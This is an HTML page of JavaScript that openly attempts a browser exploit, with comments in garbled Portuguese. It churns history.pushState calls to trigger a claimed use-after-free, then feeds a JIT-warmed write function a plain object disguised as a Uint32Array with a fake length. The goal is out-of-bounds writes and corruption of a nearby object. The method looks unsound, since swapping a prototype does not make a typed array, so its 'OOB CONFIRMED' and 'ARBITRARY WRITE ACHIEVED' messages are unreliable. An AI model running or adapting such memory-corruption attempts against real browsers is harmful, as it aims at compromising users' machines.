<!DOCTYPE html>
<html>
<head><title>JIT OOB Test</title></head>
<body>
<button onclick="test()">Test JIT OOB</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }

const BASE = 977, STEP = 14461, UAF_ITERS = 48;

async function triggerUAF() {
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    history.pushState({index:i}, "", "#" + "E".repeat(size));
    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    size += STEP;
    await new Promise(r=>setTimeout(r,5));
  }
  await new Promise(r=>setTimeout(r,200));
}

async function test() {
  log("=== JIT OOB EXPLOITATION ===\n");
  
  await triggerUAF();
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40) {
      log("[RACE] Testing JIT OOB...\n");
      
      // FunÃ§Ã£o que JIT vai compilar
      function jit_write(arr, idx, val) {
        arr[idx] = val;
        return arr[idx];
      }
      
      // Warm up com Uint32Array
      const warm = new Uint32Array(100);
      for(let i=0; i<10000; i++) {
        jit_write(warm, i % 100, i);
      }
      
      log("JIT compiled (expects Uint32Array)\n");
      
      // CRITICAL: Criar fake array com length ENORME
      const fake = {
        0: 0,
        1: 0,
        2: 0,
        3: 0,
        length: 0x1000  // 4096 elements (mas sÃ³ temos 4!)
      };
      fake.__proto__ = Uint32Array.prototype;
      
      log("Fake Uint32Array created:");
      log("  Actual properties: 4 (0-3)");
      log("  Fake length: " + fake.length + "\n");
      
      // TEST: Escrever alÃ©m dos limites reais
      log("Testing OOB writes:\n");
      
      const testIndices = [4, 10, 50, 100, 500, 1000];
      
      testIndices.forEach(idx => {
        try {
          const marker = 0xDEAD0000 + idx;
          jit_write(fake, idx, marker);
          
          log(`  [${idx}] Write 0x${marker.toString(16)}`);
          
          // Tentar ler de volta
          const readback = fake[idx];
          
          if(readback !== undefined) {
            log(`       Read: 0x${readback.toString(16)}`);
            
            if(readback === marker) {
              log(`       ðŸš¨ OOB CONFIRMED! Write+Read at index ${idx}!`);
            }
          } else {
            log(`       Read: undefined (expected)`);
          }
          
        } catch(err) {
          log(`  [${idx}] Exception: ${err.message}`);
        }
      });
      
      log("\n" + "=".repeat(60));
      
      // CRITICAL TEST: Verificar se escreveu FORA do objeto
      log("\nChecking if writes escaped object bounds:\n");
      
      // Criar objeto adjacente na memÃ³ria
      const neighbor = {
        marker: "NEIGHBOR",
        id: 12345,
        data: [1, 2, 3, 4, 5]
      };
      
      log("Created neighbor object:");
      log("  neighbor.marker: " + neighbor.marker);
      log("  neighbor.id: " + neighbor.id);
      log("  neighbor.data: [" + neighbor.data + "]\n");
      
      // Escrever MUITOS valores via fake array
      log("Writing 100 values via JIT confusion...");
      for(let i=4; i<100; i++) {
        try {
          jit_write(fake, i, 0xBEEF0000 + i);
        } catch(e) {}
      }
      
      log("\nChecking neighbor after writes:");
      log("  neighbor.marker: " + neighbor.marker);
      log("  neighbor.id: " + neighbor.id);
      log("  neighbor.data: [" + neighbor.data + "]");
      
      // Se neighbor foi corrompido, temos arb write!
      if(neighbor.marker !== "NEIGHBOR" || 
         neighbor.id !== 12345 ||
         neighbor.data.length !== 5) {
        log("\nðŸš¨ðŸš¨ðŸš¨ NEIGHBOR CORRUPTED! ðŸš¨ðŸš¨ðŸš¨");
        log("ðŸš¨ ARBITRARY WRITE ACHIEVED! ðŸš¨");
      }
    }
  });
  
  for(let i=0; i<15; i++) {
    history.back();
    await new Promise(r=>setTimeout(r,40));
  }
}
</script>
</body>
</html>
